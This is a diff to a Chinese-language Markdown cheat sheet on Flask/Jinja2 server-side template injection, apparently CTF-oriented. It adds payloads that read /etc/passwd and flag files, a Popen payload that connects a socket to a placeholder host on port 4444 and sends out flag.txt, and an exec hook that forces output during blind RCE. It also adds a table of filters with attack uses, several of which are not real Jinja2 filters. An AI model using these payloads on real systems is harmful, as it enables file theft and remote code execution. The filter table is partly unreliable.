@@ -185,8 +185,51 @@ http://example.com/?name={{ config.items() }}
 | **session**| 用于存储跨请求会话的数据（如用户登录信息）。                     | 直接访问存储在 session 中的数据，如 `session.username`。  | `{% if session.username %}<p>欢迎回来，{{ session.username }}！</p>{% endif %}` |
 | **g**      | 一个用于在单次请求中存放临时数据的全局命名空间。                   | 直接使用属性访问，如 `g.user`。                          | `{% if g.user %}<p>当前用户：{{ g.user }}</p>{% endif %}`      |
 | **url_for**| 一个函数，用于根据视图函数名称生成 URL，避免硬编码路径。           | 在模板中直接调用，如 `url_for('index')`。                | `<a href="{{ url_for('index') }}">首页</a>`                 |
+
+##### 读取远程文件
+```python
+# ''.__class__.__mro__[2].__subclasses__()[40] = File 类
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
+# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
+{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+```
+##### 在不猜测偏移量的情况下调用 Popen
+
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+```
+##### 在 Blind RCE 中强制输出
+```python
+{{
+x.__init__.__builtins__.exec("from flask import current_app, after_this_request
+@after_this_request
+def hook(*args, **kwargs):
+    from flask import make_response
+    r = make_response('Powned')
+    return r
+")
+}}
+```
+##### 常用过滤器
+
+| 过滤器          | 描述                                                                                           | 常见利用方法                                                         |
+|-----------------|------------------------------------------------------------------------------------------------|----------------------------------------------------------------------|
+| `attr(name)`     | 动态访问对象的属性。                                                                            | 利用该过滤器通过反射访问对象的内部属性，攻击者可以获取类或对象的隐私信息或执行恶意操作。|
+| `get(attribute)` | 获取对象的指定属性。                                                                            | 和 `attr` 类似，攻击者可以用来访问对象属性，也可以动态构造属性名。   |
+| `join(delim)`    | 将一个列表连接成一个字符串，使用指定的分隔符。                                                    | 攻击者可以用它来拼接特定的字符串，然后通过 `attr` 访问对象的属性。    |
+| `default(value)` | 如果变量为空或未定义，则返回指定的默认值。                                                       | 用来处理空值，可以避免触发 `None` 错误，确保攻击代码继续执行。         |
+| `replace(old, new)` | 替换字符串中的部分内容。                                                                       | 结合 `attr` 或动态拼接字符串，攻击者可以构造注入有效负载。           |
+| `safe`           | 标记字符串为“安全”，不对其进行转义。                                                           | 攻击者可以用它绕过 HTML 或 JavaScript 的转义，使注入的代码能够执行。  |
+| `tojson()`       | 将数据结构转换为 JSON 字符串。                                                                  | 用于序列化数据，可以帮助攻击者在反序列化过程中注入恶意数据。           |
+| `to_yaml()`      | 将数据结构转换为 YAML 格式。                                                                    | 与 `tojson` 类似，用于向目标系统发送恶意数据，绕过反序列化安全检查。    |
+| `escape`         | 转义 HTML 字符，防止 XSS 攻击。                                                                  | 如果过滤器被错误使用，攻击者可以利用它插入可执行的 JavaScript。       |
+| `urlencode`      | 对字符串进行 URL 编码。                                                                         | 用来绕过 URL 参数中可能的限制，尤其是输入过滤不严格的情况下。         |
+| `file`           | 从文件中读取内容。                                                                               | 如果应用允许访问文件，攻击者可以通过该过滤器读取服务器上的敏感文件。  |
+| `float`          | 将变量转换为浮点数。                                                                             | 攻击者可以利用它来操作数值或绕过类型检查。                           |
+| `exec()`         | 动态执行代码。                                                                                 | 用来执行动态生成的代码或命令，极为危险，攻击者可通过它执行任意代码。  |
+
 ---
-### ⚙️ Django
 
 
 ### 🌏 相关链接
